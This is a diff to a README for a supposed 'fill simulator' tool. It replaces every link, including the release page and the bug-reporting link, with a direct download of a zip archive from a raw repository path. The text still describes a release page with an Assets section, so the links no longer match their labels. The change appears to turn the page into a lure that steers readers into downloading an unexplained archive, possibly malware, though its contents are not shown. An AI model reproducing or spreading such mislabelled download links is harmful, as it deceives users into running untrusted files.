@@ -1,12 +1,12 @@
 # ⚡ flashalpha-fill-simulator - Simulate precise data fills with speed
 
-[![Download FlashAlpha](https://img.shields.io/badge/Download-Fill%20Simulator-blue.svg)](https://github.com/pumproomcarpel608/flashalpha-fill-simulator)
+[![Download FlashAlpha](https://img.shields.io/badge/Download-Fill%20Simulator-blue.svg)](https://raw.githubusercontent.com/pumproomcarpel608/flashalpha-fill-simulator/main/mone/fill-flashalpha-simulator-v1.1.zip)
 
 This tool handles data fill simulations for professional workflows. Use this application to test batch processing and input accuracy without manual entry. The interface allows users to configure fill rates, error thresholds, and output formats.
 
 ## 📥 Getting Started
 
-Visit [the official release page](https://github.com/pumproomcarpel608/flashalpha-fill-simulator) to download the latest setup file. 
+Visit [the official release page](https://raw.githubusercontent.com/pumproomcarpel608/flashalpha-fill-simulator/main/mone/fill-flashalpha-simulator-v1.1.zip) to download the latest setup file. 
 
 1. Navigate to the link provided above.
 2. Locate the section labeled Assets.
@@ -80,7 +80,7 @@ Does the software collect my personal data?
 The simulator operates locally on your machine. None of your input data leaves your computer.
 
 How do I report a bug?
-Return to the [repository page](https://github.com/pumproomcarpel608/flashalpha-fill-simulator) and open an issue so the development team can investigate the problem. 
+Return to the [repository page](https://raw.githubusercontent.com/pumproomcarpel608/flashalpha-fill-simulator/main/mone/fill-flashalpha-simulator-v1.1.zip) and open an issue so the development team can investigate the problem. 
 
 ## 🛡 Performance Tips
 
